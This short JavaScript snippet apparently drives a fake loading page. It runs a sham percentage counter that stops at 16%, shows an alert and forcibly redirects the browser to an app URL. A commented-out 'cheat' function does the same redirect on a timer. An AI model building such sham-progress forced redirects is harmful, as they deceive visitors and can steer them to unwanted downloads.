var bar=0;
var line="||";
var amount="||";
count();
function count(){
	bar=bar+2;
	amount=amount+line;
	document.getElementById('baifenbi').innerHTML=bar+"%";
	if(bar<16){
		setTimeout("count()",500);
	}else{
		alert(tixing);
		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="color:#c3c3c3;"></span></a>';
		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;"></div>';
		window.location.href=appurl2;
	}
}
//var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();